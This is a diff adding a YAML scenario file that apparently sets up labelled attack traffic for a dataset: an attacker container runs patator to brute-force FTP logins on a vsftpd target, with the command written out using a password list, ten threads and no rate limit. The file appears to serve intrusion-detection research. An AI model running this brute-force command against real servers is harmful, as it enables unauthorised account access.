@@ -1,0 +1,16 @@
+attacker:
+  name: ftp-patator
+  image: ghcr.io/simonhondekyn/ftp-patator:cic
+  atkCommand: python patator.py ftp_login host=$TARGET_IP user=iscxtap password=FILE0 0=passwords.txt --rate-limit=0 --threads=10
+target:
+  name: vsftpd
+  image: ghcr.io/simonhondekyn/vsftpd:cic
+  startupProbe:
+    tcpSocket:
+      port: 21
+    initialDelaySeconds: 5
+    periodSeconds: 5
+labels:
+  label: 1
+  category: "bruteforce"
+  subcategory: "ftp-patator"
